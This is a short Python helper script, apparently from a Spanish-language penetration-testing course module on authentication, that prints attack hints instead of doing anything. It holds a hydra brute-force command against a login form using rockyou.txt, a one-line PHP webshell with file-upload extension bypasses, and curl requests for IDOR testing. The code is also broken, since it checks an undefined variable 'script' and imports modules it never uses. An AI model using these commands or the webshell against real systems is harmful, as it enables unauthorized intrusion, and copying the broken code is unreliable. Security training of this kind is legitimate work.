#!/usr/bin/env python3
"""
auth_attack.py -- Ver documentacion en el modulo 06-Autenticacion
"""
import argparse, subprocess

def main():
    print("\n  Modulo: 06-Autenticacion/auth_attack.py")
    print("  Ver guia completa: 06-Autenticacion/autenticacion.md\n")
    print("  Herramientas disponibles en Kali:")
    if "auth" in script:
        print("    hydra, ffuf, jwt_tool")
        print("  Ejemplo:")
        print("    hydra -l admin -P rockyou.txt http-post-form")
        print("       '/login:user=^USER^&pass=^PASS^:Invalid credentials'")
    elif "upload" in script:
        print("    burpsuite (modificar Content-Type y extension)")
        print("  Crear webshell: echo '<?php system($_GET[\"c\"]); ?>' > shell.php")
        print("  Bypass: renombrar a shell.php.jpg o shell.pHp")
    elif "api" in script:
        print("    burpsuite, ffuf, curl")
        print("  IDOR test: curl -H 'Auth: TOKEN' http://api.com/users/1")
        print("             curl -H 'Auth: TOKEN' http://api.com/users/2")

if __name__ == "__main__":
    main()
